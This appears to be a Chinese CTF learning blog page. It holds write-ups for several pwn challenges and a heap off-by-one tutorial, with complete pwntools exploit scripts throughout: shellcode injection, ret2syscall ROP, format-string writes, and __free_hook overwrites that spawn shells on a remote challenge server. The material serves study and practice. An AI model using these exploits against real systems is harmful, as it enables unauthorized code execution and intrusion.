12345678910111213141516171819202122232425262728##!/usr/bin/env pythonfrom pwn import *sh = process(&#x27;./pwn01&#x27;)#sh = remote(&quot;101.43.247.245&quot;,9200)#systemaddr = 0x8048440#binsh = 0x80486C0#sh.sendline(b&#x27;A&#x27; * (0x68+4) + p32(systemaddr)+p32(0)+p32(binsh))context.log_level= &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#gdb.attach(sh,&quot;b *0x80488F2&quot;)#gdb.attach(sh)sh.recvuntil(b&quot;say&quot;)sh.sendline(b&quot;a&quot;*0x68)#addr = u32(sh.recv(8)[4:8])sh.recv(0x68)addr = u32(sh.recv(4))print(hex(addr))#pause()shellcode = asm(shellcraft.sh())nop = asm(&#x27;&#x27;&#x27;        nop        &#x27;&#x27;&#x27;)shellcode = nop*40+shellcodepayload = shellcode.ljust(0x68,b&#x27;b&#x27;) + p32(0)+p32(addr+0x2e+0x28-4)sh.sendline(payload)sh.interactive()


还遇到很玄学的问题,nop加多了,怎么也不行,
感觉像是后面的指令并没有识别出来      不多,好像是没传送完全?

pwn2​		加了nx保护,用rop吧,ret2syscall, 这下不用算哪个比较恶心的shellcode的位置了,用ret2syscall是因为没有找到system函数..
​		execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)
​		其中，该程序是 32 位，所以我们需要使得

系统调用号，即 eax 应该为 0xb

第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。

第二个参数，即 ecx 应该为 0

第三个参数，即 edx 应该为 0
没有 &#x2F;bin&#x2F;sh,那就写入到栈后面,反正需要栈的地址,计算一下就可以了


1234567891011120x080b8eb6 : pop eax ; ret0x080481c9 : pop ebx ; ret0x080df8bd : pop ecx ; ret0x0806f83b : pop edx ; ret0x0806d443 : int 0x80============================================================0x08048798 : leave ; ret

​		写一下payload
​		栈是104+4(ebp) &#x3D; 108, 溢出了 256-108 &#x3D; 148字节
1234binsh =  addr + 10*4payload= b&quot;a&quot;*0x68 + b&quot;b&quot;*4 + p32(pop_eax)+p32(0xb)+p32(pop_ebx)+p32(binsh)+p32(pop_ecx)+p32(0)+p32(pop_edx)+p32(0) + p32(int80)

泄露栈地址​		puts函数遇到\n才会停止,所以可以以此来泄露栈上残留的值来泄露地址,其实不一定要泄露这个,哪个都行, 不过有一个问题就是,这个值会是固定的嘛… 
​		不是固定的….可以换一个泄露,但是如果覆盖了ebp的话,是不是会影响栈桢呢….

​		溢出长度是不够的,需要栈迁移
​		当时好像想的是先把&#x2F;bin&#x2F;sh写到一个地方…
这是做的时候写的exp,是有概率拿到shell的…
12345678910111213141516171819202122232425262728293031323334353637383940##!/usr/bin/env pythonfrom pwn import *#sh = process(&#x27;./pwn1&#x27;)sh = remote(&quot;101.43.247.245&quot;,9201)#systemaddr = 0x8048440#binsh = 0x80486C0#sh.sendline(b&#x27;A&#x27; * (0x68+4) + p32(systemaddr)+p32(0)+p32(binsh))context.log_level= &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#gdb.attach(sh,&quot;b *0x80488F2&quot;)#gdb.attach(sh)# 泄露栈地址sh.recvuntil(b&quot;say&quot;)sh.sendline(b&quot;a&quot;*0x68)#addr = u32(sh.recv(8)[4:8])sh.recv(0x68)addr = u32(sh.recv(4))pop_eax = 0x080b8eb6pop_ebx = 0x080481c9pop_ecx = 0x080df8bdpop_edx = 0x0806f83bint80 = 0x0806d443leaveret = 0x08048798binsh =  addr + 0xae-0x78+0x10-4 + 11*4-4payload= p32(pop_eax)+p32(0xb)+p32(pop_ebx)+p32(binsh)+p32(pop_ecx)+p32(0)+p32(pop_edx)+p32(0) + p32(int80) + b&quot;/bin/sh\x00&quot;#payload= b&quot;/bin/sh\x00&quot;*0x8payload = payload.ljust(0x68,b&quot;a&quot;)+p32(addr+0xae-0x78+0x10-4)+p32(leaveret)#payload = payload.ljust(0x68,b&quot;a&quot;) +p32(0)+p32(addr+0xbe-0x78+0x10-4)print(hex(addr))print(hex(addr+0xae-0x78+0x10-4))sh.sendline(payload)sh.interactive()

​		查看符号 readelf objdump?
pwn3恶心的过滤…怎么把过滤应用到这了,
主要是 一个常用的指令, push xxx, 转成字节码会有\x68,正好命中了规则,草!
1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283##!/usr/bin/env pythonfrom pwn import *#context(os=&#x27;linux&#x27;,arch=&quot;i386&quot;)#sh = process(&#x27;./pwn3&#x27;)sh = remote(&quot;101.43.247.245&quot;,9202)#systemaddr = 0x8048440#binsh = 0x80486C0#sh.sendline(b&#x27;A&#x27; * (0x68+4) + p32(systemaddr)+p32(0)+p32(binsh))context.arch= &#x27;x86&#x27;context.log_level= &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#gdb.attach(sh,&quot;b *0x8048967&quot;)#gdb.attach(sh)sh.recvuntil(b&quot;say&quot;)&#x27;&#x27;&#x27;sh.sendline(b&quot;a&quot;*0x60+p32(0)+p32(0x99999)+b&quot;d&quot;*8)#sh.sendline(b&quot;a&quot;*0x70)#addr = u32(sh.recv(8)[4:8])sh.recv(0x70)addr = u32(sh.recv(4))print(hex(addr))print(hex(addr+0xbe-0x90+0x28+4))&#x27;&#x27;&#x27;pop_eax = 0x080b8f16pop_ebx = 0x080481c9pop_ecx = 0x080df91dpop_edx = 0x0806f89bint80 = 0x0806d4a3leaveret = 0x08048798bssaddr = 0x080ECDBBjmpesp = 0x080dea1f#binsh =  addr + 0xae-0x78+0x10-4 + 11*4-4str = &quot;&quot;#shellcode = asm(&quot;push 0x0;&quot;)shellcode = asm(&#x27;&#x27;&#x27;        push 0        mov eax,0x7478742e        push eax        mov  eax,0x67616c66        push eax        mov ebx,esp        xor ecx,ecx         #0        xor edx,edx         #0        mov eax,0x5         #调用号        int 0x80        mov eax,0x3;        mov ecx,ebx;    # ecx = char __user *buf 缓冲区，读出的数据--&gt;也就是读“flag”        mov ebx,0x3;    # 文件描述符 fd:是文件描述符 0 1 2 3 代表标准的输出输入和出错,其他打开的文件        mov edx,0x120;  #对应字节数        int 0x80;        mov eax,0x4;    # eax = sys_write        mov ebx,0x1;    # ebx = unsigned int fd = 1        int 0x80;        &#x27;&#x27;&#x27;)#shellcode = b&quot;\x66\x6c\x61\x67&quot; + shellcodeprint(shellcode)#shellcode = asm(&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;)#shellcode+=asm(&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;)#shellcode+=asm(&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;)payload1 = p32(pop_eax)+p32(0xb)+p32(pop_ebx)+p32(0)+p32(pop_ecx)+p32(0)+p32(pop_edx)+p32(0) + p32(int80) + b&quot;cat$flag.txt\x00&quot;#payload1 = p32(pop_eax)+p32(0x3)+p32(pop_ebx)+p32(0)+p32(pop_ecx)+p32(bssaddr)+p32(pop_edx)+p32(0x20) + p32(int80)#payload2 = p32(pop_eax)+p32(0x5)+p32(pop_ebx)+p32(bssaddr)+p32(pop_ecx)+p32(0)+p32(pop_edx)+p32(0) + p32(int80)#payload2 += p32(pop_eax)+p32(0x3)+p32(pop_ebx)+p32(3)+p32(pop_ecx)+p32(bssaddr)+p32(pop_edx)+p32(0x20) + p32(int80)#payload2 += p32(pop_eax)+p32(0x3)+p32(pop_ebx)+p32(0)+p32(pop_ecx)+p32(bssaddr)+p32(pop_edx)+p32(0x20) + p32(int80)#payload = shellcode#print(payload)#print(&quot;length&quot;)#print(len(payload))#shellcode = b&quot;&quot;payload = shellcode.ljust(0x60,b&quot;a&quot;) + p32(0)+p32(0xaaaaa) + p64(0) + p32(0xaaa) + p32(jmpesp) + asm(&quot;sub esp,0x78;jmp esp&quot;)#payload = b&quot;a&quot;*0x60 + p32(0)+p32(0xaaaaa) + p64(0) + p32(0xaaa) + p32(jmpesp) + asm(&quot;sub esp,0x78;jmp esp&quot;)#payload = b&quot;a&quot;*0x60 + p32(0)+p32(0x9999)sh.sendline(payload)sh.recv(0x120)sh.interactive()





pwn4​		0x68 ebp ret 的栈空间      输入0x80 24字节溢出, 减去4字节ebp的话,还有20字节
​		只开了NX,那就还是rop吧,这个有system和&#x2F;bin&#x2F;sh、或者直接后门函数..
1234567891011121314151617181920plt 0x8048440 system  0x80486C0 binsh.text:080485BD                 public shell.text:080485BD shell           proc near.text:080485BD ; __unwind &#123;.text:080485BD                 push    ebp.text:080485BE                 mov     ebp, esp.text:080485C0                 sub     esp, 8.text:080485C3                 sub     esp, 0Ch.text:080485C6                 push    offset command  ; &quot;/bin/sh&quot;.text:080485CB                 call    _system.text:080485D0                 add     esp, 10h.text:080485D3                 nop.text:080485D4                 leave.text:080485D5                 retn.text:080485D5 ; &#125; // starts at 80485BD.text:080485D5 shell           endp.text:080485D5

​		怎么看system的地址呢?,就是push的值不一样,但怎么确定哪个是system呢? (这个是动态链接了!)

exp
123456789from pwn import *#sh = process(&#x27;./pwn04&#x27;)sh = remote(&quot;101.43.247.245&quot;,9203)systemaddr = 0x8048440binsh = 0x80486C0sh.sendline(b&#x27;A&#x27; * (0x68+4) + p32(systemaddr)+p32(0)+p32(binsh))# sh.sendline(b&#x27;A&#x27; * (0x68+4) + p32(0x80485BD))sh.interactive()





pwn5主要是要理解清楚逻辑和内存代码布局就可以了
123456789101112131415161718192021222324252627signed int sub_80488CE()&#123;  int v0; // eax  char v2; // [esp-Ch] [ebp-24h]  int v3; // [esp+Ch] [ebp-Ch]  sub_804887C();  v3 = sub_8059F50(48);  sub_8048987(v3, 48);  v0 = sub_804DBD0(v3 + 16) + 5;  if ( v0 == 8 )  &#123;    sub_8048987(v3, 48);  &#125;  else if ( v0 &gt; 8 )  &#123;    if ( v0 == 10 )      return 0;    if ( v0 == 85145 )      sub_804F700(&quot;/bin/sh&quot;);  &#125;  else if ( v0 == 6 )  &#123;    sub_804FA00(&quot;where is shell&quot;, v2);  &#125;  return 1;&#125;



12345678910111213141516from pwn import *#sh = process(&#x27;./pwn5&#x27;)sh = remote(&quot;101.43.247.245&quot;,9204)systemaddr = 0x8048440binsh = 0x80486C0context.log_level= &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#gdb.attach(sh,&quot;b *0x008048987&quot;)#payload = p32(0x1234)+p32(0x1234)+ p32(0x1234)+p32(0x1234)+ p32(0x1234)+p32(0x1234)+ p32(0x1234)+p32(0x1234)+p32(0x14c94000)payload = &quot;1234123412341234&quot; + &quot;85140&quot;sh.sendline(payload)sh.interactive()







pwn6看看又改了啥…
123456789101112131415161718192021222324252627signed int sub_80488CE()&#123;  int v0; // eax  char v2; // [esp-Ch] [ebp-24h]  char *nptr; // [esp+Ch] [ebp-Ch]  sub_804887C();  nptr = (char *)sub_8059F40(48);  sub_8048980(nptr, 48);  v0 = atoi_0(nptr);  if ( v0 == 2 )  &#123;    sub_8048980(nptr, 48);  &#125;  else if ( v0 &gt; 2 )  &#123;    if ( v0 == 3 )      return 0;    if ( v0 == 12345 )      sub_804F6F0(&quot;/bin/sh&quot;);  &#125;  else if ( v0 == 1 )  &#123;    sub_804F9F0(&quot;where is shell&quot;, v2);  &#125;  return 1;&#125;



输入12345即可
root@hecs-149507:~&#x2F;haida# nc 101.43.247.245 9205
12345
pwn7123456789int sub_89588B7()&#123;  char s; // [esp+0h] [ebp-68h]  sub_895F980(&quot;please input the way you want go&quot;);  __libc_read(0, &amp;s, 96);  _IO_puts(&amp;s);  return sub_80488E7(&amp;s, 0);&#125;





一个char为什么能占据那么多栈空间???
应该是有很多路径,可以根据&#x2F;bin&#x2F;sh回溯吧?
是的…一点点回溯就可以找到
845542A -&gt; 816c3f7-&gt;8091787-&gt;805ac47 -&gt;804d177-&gt;8049ae7-&gt;8048cd7-&gt;8048977-&gt;80488e7-&gt;main
p32(87)+p32(83)+p32(68)+p32(87)+p32(65)+p32(65)+p32(87)+p32(68)+p32(87)
878368876565876887
WSDWAAWDW(这个就是答案)
为什么87变成0x38了 56了
0x80488fd  movzx eax, byte ptr [eax]
pwn8格式化字符串,修改内存值即可
修改0x80EBF9C处的值为28
1234567891011121314int sub_80488CE()&#123;  int result; // eax  char v1; // [esp+0h] [ebp-68h]  sub_804F9B0(&quot;please input what you want say&quot;);  __libc_read(0, &amp;v1, 96);  sub_804F9B0(&amp;v1);  if ( dword_80EBF9C == 28 )    result = sub_804F6B0(&quot;/bin/sh&quot;);  else    result = sub_804F9B0(&quot;the key is %d %d&quot;);  return result;&#125;









123456789101112131415from pwn import *payload = b&quot;%28d&quot; + b&quot;A&quot; * (0x90 - len(b&quot;%28d&quot;)) + p32(0x80EBF9C)sh = remote(&quot;101.43.247.245&quot;,9207)context.log_level= &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#gdb.attach(sh,&quot;b *0x008048987&quot;)#payload = b&quot;%28d&quot; + b&quot;A&quot; * (0x90 - len(b&quot;%28d&quot;)) + p32(0x80EBF9C)payload = fmtstr_payload(4,&#123;0x80EBF9C:28&#125;)sh.sendline(payload)sh.interactive()











pwn91234567891011int sub_8048945()&#123;  char v1; // [esp+0h] [ebp-1B8h]  char v2; // [esp+150h] [ebp-68h]  _IO_puts(&quot;please input your username&quot;);  __libc_read(0, &amp;v2, 32);  _IO_puts(&quot;please input your passwd&quot;);  __libc_read(0, &amp;v1, 335);  return sub_80488E7(&amp;v1);&#125;





不存在溢出
后面函数是往一个地址写数据..有什么用呢?
有后们函数,所以应该是要覆盖字符串,或者说字符串复制
0x08048948 覆盖为 0x80488CE(system)
第一次写入要覆盖的地址,第二次覆盖
问题回头有时间可以自己编译一下符号
​	这样其实有问题,不太对,因为ebp那里的值其实是不确定的,但总是会往前指,或多或少,有时候正好指到shellcode开头或者偏移一点点,至于为什么呢…可以后面在研究
哪个都行, 不过有一个问题就是,这个值会是固定的嘛…
plt的过程再熟悉下
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/" title="pwn入门-29-off—by-one">pwn入门-29-off—by-one</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-06-03T08:04:02.000Z" title="发表于 2023-06-03 16:04:02">2023-06-03</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-12-04T09:36:24.474Z" title="更新于 2023-12-04 17:36:24">2023-12-04</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a></span></div><div class="content">总的感觉就是通过off by null来修改size区域,然后造成堆块合并,使得堆块重叠,可以修改可控堆块,
主要看了一个这里面的例子:https://www.jianshu.com/p/8eb55c40ec4a 还有权威指南的pwn书
https://github.com/shellphish/how2heap/blob/master/glibc_2.23/poison_null_byte.c how2heap的例子也不错
demo
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;assert.h&gt;char *ptr[0x100] = &#123;0&#125;;void menu()&#123;    puts(&quot;1.malloc&quot;);    puts(&quot;2.edit&quot;);    puts(&quot;3.show&quot;);    puts(&quot;4.free&quot;);    puts(&quot;5.exit&quot;);&#125;void my_malloc()&#123;    int index,size;    puts(&quot;index:&quot;);    scanf(&quot;%d&quot;,&amp;index);    puts(&quot;size:&quot;);    scanf(&quot;%d&quot;,&amp;size);    ptr[index] = malloc(size);    puts(&quot;content:&quot;);    read(0,ptr[index],size);&#125;void my_edit()&#123;    int index,size;    puts(&quot;index:&quot;);    scanf(&quot;%d&quot;,&amp;index);    puts(&quot;size:&quot;);    scanf(&quot;%d&quot;,&amp;size);    puts(&quot;content:&quot;);    read(0,ptr[index],size);&#125;void my_free()&#123;    int index;    puts(&quot;index:&quot;);    scanf(&quot;%d&quot;,&amp;index);    free(ptr[index]);&#125;void my_show()&#123;    int index;    puts(&quot;index:&quot;);    scanf(&quot;%d&quot;,&amp;index);    puts(ptr[index]);&#125;int main()&#123;    setbuf(stdin, NULL);    setbuf(stdout, NULL);    puts(&quot;welcome&quot;);    while(1)&#123;        int op;        menu();        scanf(&quot;%d&quot;,&amp;op);        if(op == 1) my_malloc();        else if(op == 2) my_edit();        else if(op == 3) my_show();        else if(op == 4) my_free();        else if(op == 5) exit(0);        else puts(&quot;invalid!&quot;);    &#125;    return 0;&#125;

​	这个demo里的edit可以得到任意size,但假设只能溢出1字节
利用1:扩展被释放块​	利用思路可以总结为通过拓展一个被释放的块,覆盖掉后面的块,可以修改后面块的内容,比如fd,bk或者函数指针等,从而可以进一步利用
gcc -g demo.c demo1
patchelf –set-interpreter ~&#x2F;pwn&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.27-3ubuntu1_amd64&#x2F;ld-linux-x86-64.so.2 .&#x2F;demo1
patchelf –set-rpath &#x2F;root&#x2F;pwn&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.27-3ubuntu1_amd64&#x2F; .&#x2F;demo1

​		覆盖前

​		覆盖后,可以修改后面的bin的内容了,然后再申请后面bin,就可以申请到free_hook等任意地址,进行修改

​	0x51的原因是  0x418 (0x410其实是) + 0x10的头 + 0x20的数据(或者说0x28) + 0x10的头
​	所以就等于0x450, 不存在0x458这种,   其实这里改成多少都行,能覆盖到就可以了
1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from pwn import *context.log_level = &#x27;debug&#x27;p = process(&#x27;./demo1&#x27;)libc = ELF(&#x27;/root/pwn/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&#x27;)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#gdb.attach(p)def cmd(a):    p.recvuntil(&#x27;5.exit&#x27;)    p.sendline(str(a))def alloc(index,size,content):    cmd(1)    p.recvuntil(&#x27;index&#x27;)    p.sendline(str(index))    p.recvuntil(&#x27;size&#x27;)    p.sendline(str(size))    p.recvuntil(&#x27;content&#x27;)    p.send(content)def edit(index,size,content):    cmd(2)    p.recvuntil(&#x27;index&#x27;)    p.sendline(str(index))    p.recvuntil(&#x27;size&#x27;)    p.sendline(str(size))    p.recvuntil(&#x27;content&#x27;)    p.send(content)def show(index):    cmd(3)    p.recvuntil(&#x27;index:\n&#x27;)    p.sendline(str(index))def free(index):    cmd(4)    p.recvuntil(&#x27;index:\n&#x27;)    p.sendline(str(index))alloc(0,0x18,b&#x27;a&#x27;)alloc(1,0x418,b&#x27;b&#x27;)alloc(2,0x28,b&#x27;c&#x27;)free(1)edit(0,0x19,p64(0)*3+p8(0x51))alloc(3,0x448,b&#x27;\xa0&#x27;) # 0x440 0x448都可以,free(2)show(3)leak_libc = u64(p.recv(6).ljust(8,b&quot;\x00&quot;))libc_base = leak_libc - 0x3ebca0 # main+96和libc起始位置偏移free_hook = libc_base + libc.symbols[&#x27;__free_hook&#x27;]system = libc_base + libc.symbols[&#x27;system&#x27;]#print(hex(leak_libc))edit(3,0x448,b&#x27;a&#x27;*0x418+p64(0x31)+p64(free_hook))alloc(4,0x28,b&#x27;/bin/sh&#x27;)alloc(5,0x28,p64(system))free(4)p.interactive()#pause()

​	
​	奇怪的是,这里的free(2)为什么没有被合并呢, 一般需要加一个堆块挡着
​	
利用2: 扩展已分配块
​		感觉和1差不多其实,就是换一下顺序
1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from pwn import *context.log_level = &#x27;debug&#x27;p = process(&#x27;./demo1&#x27;)libc = ELF(&#x27;/root/pwn/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&#x27;)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#gdb.attach(p)def cmd(a):    p.recvuntil(&#x27;5.exit&#x27;)    p.sendline(str(a))def alloc(index,size,content):    cmd(1)    p.recvuntil(&#x27;index&#x27;)    p.sendline(str(index))    p.recvuntil(&#x27;size&#x27;)    p.sendline(str(size))    p.recvuntil(&#x27;content&#x27;)    p.send(content)def edit(index,size,content):    cmd(2)    p.recvuntil(&#x27;index&#x27;)    p.sendline(str(index))    p.recvuntil(&#x27;size&#x27;)    p.sendline(str(size))    p.recvuntil(&#x27;content&#x27;)    p.send(content)def show(index):    cmd(3)    p.recvuntil(&#x27;index:\n&#x27;)    p.sendline(str(index))def free(index):    cmd(4)    p.recvuntil(&#x27;index:\n&#x27;)    p.sendline(str(index))alloc(0,0x18,b&#x27;a&#x27;)alloc(1,0x418,b&#x27;b&#x27;)alloc(2,0x28,b&#x27;c&#x27;)alloc(3,0x28,b&#x27;d&#x27;)edit(0,0x19,p64(0)*3+p8(0x51))free(1)alloc(4,0x448,b&#x27;\xa0&#x27;)show(4)leak_libc = u64(p.recv(6).ljust(8,b&quot;\x00&quot;))libc_base = leak_libc - 0x3ebca0 # main+96和libc起始位置偏移free_hook = libc_base + libc.symbols[&#x27;__free_hook&#x27;]system = libc_base + libc.symbols[&#x27;system&#x27;]print(hex(leak_libc))free(2)edit(4,0x448,b&#x27;a&#x27;*0x418+p64(0x31)+p64(free_hook))alloc(5,0x28,b&#x27;/bin/sh&#x27;)alloc(6,0x28,p64(system))free(5)p.interactive()#pause()





利用3: 收缩被释放块 poison null byte​	权威指南里面的图,还不错
​	总的俩说还是造成堆块重叠

​		博主的图,也不错,不过最后好像少了一块,进行了补全





free 5之前

free之后tcachebin 0x50多了一项,此时利用edit修改fd,就可以实现任意地址写

修改fd后,此时就可以修改hook指针getshell

exp
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475from pwn import *context.log_level = &#x27;debug&#x27;p = process(&#x27;./demo&#x27;)libc = ELF(&#x27;/root/pwn/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&#x27;)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#gdb.attach(p)def cmd(a):    p.recvuntil(&#x27;5.exit&#x27;)    p.sendline(str(a))def alloc(index,size,content):    cmd(1)    p.recvuntil(&#x27;index&#x27;)    p.sendline(str(index))    p.recvuntil(&#x27;size&#x27;)    p.sendline(str(size))    p.recvuntil(&#x27;content&#x27;)    p.send(content)def edit(index,size,content):    cmd(2)    p.recvuntil(&#x27;index&#x27;)    p.sendline(str(index))    p.recvuntil(&#x27;size&#x27;)    p.sendline(str(size))    p.recvuntil(&#x27;content&#x27;)    p.send(content)def show(index):    cmd(3)    p.recvuntil(&#x27;index:\n&#x27;)    p.sendline(str(index))def free(index):    cmd(4)    p.recvuntil(&#x27;index:\n&#x27;)    p.sendline(str(index))alloc(1,0x18,b&#x27;a&#x27;)alloc(2,0x100,b&#x27;b&#x27;)alloc(3,0x80,b&#x27;c&#x27;)alloc(4,0x10,b&#x27;d&#x27;)edit(2,0x100,b&#x27;\x00&#x27; * 0xf0 + p64(0x100))#这里写一个0x100是为了绕过检查，因为之前的0x111被改成了0x100#ptmalloc会根据nextchunk的prev_size字段检查是否大小匹配。这里写入0x100的地方正好是利用off-by-null漏洞后nextchunk的prev_size字段。for i in range(9,16):    alloc(i,0x108,b&#x27;p&#x27;)for i in range(9,16):    free(i)# tcache填充 free(2)edit(1,0x19,b&#x27;A&#x27; * 0x18 + p8(0))alloc(2,0x80,&#x27;d&#x27;)alloc(5,0x40,&#x27;e&#x27;)for i in range(17,24):    alloc(i,0x88,b&#x27;p&#x27;)for i in range(17,24):    free(i)# 让2  free到unsortedbin里free(2)free(3)  # 与之前残留的0x110一起合并 注意这个3的位置  0x90+0x110 =0x1a0 alloc(6,0xa0,b&#x27;\xa0&#x27;)free(5) # 这里也很关键,再次释放5,5又与前面的2组合为show(6)leak_libc = u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))print(hex(leak_libc))libc_base = leak_libc - 0x00007f74b3a5cca0 + 0x7f74b3671000 - 0x200free_hook = libc_base + libc.symbols[&#x27;__free_hook&#x27;]system = libc_base + libc.symbols[&#x27;system&#x27;]edit(6,0xa0,p8(0) * 0x80 + p64(0x90) + p64(0x50) + p64(free_hook))pause()alloc(7,0x40,b&#x27;/bin/sh\x00&#x27;)alloc(8,0x40,p64(system))free(7)#log.success(hex(libc_base))#gdb.attach(p)#pause()p.interactive()



问题libc.symbols 覆盖的到底是什么呢?
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-28-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E8%80%83%E8%AF%95%E4%B8%80%E9%A2%98/" title="pwn入门-28-高级网络攻防考试一题">pwn入门-28-高级网络攻防考试一题</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-06-02T13:00:51.000Z" title="发表于 2023-06-02 21:00:51">2023-06-02</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-09T12:28:13.910Z" title="更新于 2023-06-09 20:28:13">2023-06-09</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a></span></div><div class="content">​		在考试的时候没有做出来,考完后和老曹交流学会了,主要卡住的点,是走错了方向,一直在考虑堆的漏洞怎么利用,其实不是堆的漏洞,怎么说呢,其实是一个知识点的事,init_array这个节,会进行一些初始化操作,不知道确实很难搞…不过其实也不是没有办法,其实可以进行一些全局搜索之类的,寻找线索.
​		题目文件: 本链接加attachments.tar.gz
解题思路寻找对应函数123456789101112131415161718192021222324252627282930313233__int64 __fastcall main(const char *a1, char **a2, char **a3)&#123;  int v4; // [rsp+14h] [rbp-Ch] BYREF  unsigned __int64 v5; // [rsp+18h] [rbp-8h]  v5 = __readfsqword(0x28u);  ((void (__fastcall *)(const char *, char **, char **))sub_14A9)(a1, a2, a3);  while ( 1 )  &#123;    ((void (__fastcall *)(const char *))sub_1531)(a1);    printf(&quot;choice: &quot;);    a1 = &quot;%d&quot;;    __isoc99_scanf(&quot;%d&quot;, &amp;v4);    if ( v4 == 4 )      break;    if ( v4 &lt;= 0 )      exit(1);    ((void (*)(const char *, ...))((char *)*(&amp;off_5000 + v4 - 1) + 0xDEADBEEFLL))(&quot;%d&quot;, &amp;v4);  &#125;  return 0LL;&#125;unsigned __int64 sub_1531()&#123;  unsigned __int64 v1; // [rsp+8h] [rbp-8h]  v1 = __readfsqword(0x28u);  puts(&quot;1. add&quot;);  puts(&quot;2. delete&quot;);  puts(&quot;3. edit&quot;);  puts(&quot;4. exit&quot;);  return v1 - __readfsqword(0x28u);&#125;

​		一上来看sub_1531是能看到菜单的,但是很明显,下面没有对应的函数,就感到很奇怪了,(其实下次可以直接在ida的函数列表里找,如果不是花指令的话,花指令的话,还是直接看汇编,看有没有红色的代码)
​		当时是在gdb中动态调试找到的对应的函数
​		同时发现了一个gift函数,用来泄露地址的,还发现了一个后门函数,可以直接getshell,于是现在的问题就变成了怎么执行这个后门函数呢? 也就是怎么劫持控制流, 覆盖返回地址 or 利用堆进行任意内存读写, 似乎 都不太行…于是就卡住了
1234567891011121314151617181920unsigned __int64 sub_1206()&#123;  void *v0; // rax  unsigned __int64 v2; // [rsp+8h] [rbp-8h]  v2 = __readfsqword(0x28u);  puts(&quot;Ok, you find the gift&quot;);  v0 = malloc(0LL);  printf(&quot;%#lx, %#lx, %#lx\n&quot;, sub_1206, &amp;write, v0);  return v2 - __readfsqword(0x28u);&#125;unsigned __int64 sub_11C9()&#123;  unsigned __int64 v1; // [rsp+8h] [rbp-8h]  v1 = __readfsqword(0x28u);  system(&quot;/bin/sh&quot;);  return v1 - __readfsqword(0x28u);&#125;



柳暗花明差一村12345  ((void (*)(const char *, ...))((char *)*(&amp;off_5000 + v4 - 1) + 0xDEADBEEFLL))(&quot;%d&quot;, &amp;v4);.data:0000000000005000 off_5000        dq 0FFFFFFFF21525389h   ; DATA XREF: main+A0↑o.data:0000000000005008                 dq 0FFFFFFFF21525477h.data:0000000000005010                 dq 0FFFFFFFF21525518h

​		当时在main函数中,看到了这个,也理解了off_5000是data节中的数据,利用这里的数据进行一些运算,然后就到达了函数地址,例如0位置,运算后就是add函数的位置,但是 gift和后门函数,都在内存中没有这个偏移,堆虽然可以写,但是不知道堆的地址呀,但gift可以泄露,但gift怎么调用呢??  于是就卡死了………
​		其实这里可以尝试爆破的…(我觉得),后面有时间可以试试
​		于是就在这里卡死了…就像开头提的一样,其实在init_array中有初始化这个操作,保存了gift对应的地址,怎么说呢…应该让自己多学一点工具,辅助自己去探索可能的路径

正解​		elf执行时会先走这个init,这里面有个sub_144E,就是它把gift函数加载进去了,能够看到,它加载到的地址的偏移就是0x29C0
